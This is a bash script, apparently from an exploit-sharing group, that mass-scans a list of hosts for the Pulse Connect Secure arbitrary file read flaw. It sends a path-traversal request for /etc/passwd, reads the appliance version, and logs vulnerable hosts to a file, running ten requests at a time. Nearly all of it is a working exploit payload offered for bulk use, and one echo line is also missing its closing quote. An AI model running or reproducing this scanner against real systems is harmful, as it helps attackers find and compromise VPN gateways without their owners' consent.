#!/bin/bash
## Usage : bash file.sh list.txt
green='\e[92m'
blue='\e[34m'
red='\e[31m'
white='\e[39m'
list=$1
THREAD=10

pulSe(){
    bjir=$(curl -Iks --path-as-is "https://$url/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/" | head -n 1 | cut -d' ' -f2)
    version=$(curl -sk "https://$url/dana-na/nc/nc_gina_ver.txt" | grep "PARAM NAME=\"ProductVersion\"" | cut -d '"' -f 4)
    echo "[+] ${url}"
    printf "[+] Pulse Connect Secure ${blue}${version}${white}\n"
    echo -n "[?] Testing Arbitrary File Read..."
    if [[ "$bjir" == 200 ]]; then
    printf "${green}Vulnerable!${white}\n\n"
    echo ${url} >> anj.txt
    else
    printf "${red}Not Vulnerable!${white}\n\n"
    fi
}
echo ""
echo "Pulse Connect Secure"
echo "This script only check LFI"
echo "Created By Con7ext"
echo "Exploit-Kita"
echo "Reference: https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html"
echo "List without http/https
echo ""
for url in `cat $list`;
do
    ((cthread=cthread%THREAD)); ((cthread++==0)) && wait
    pulSe $url &
done
wait
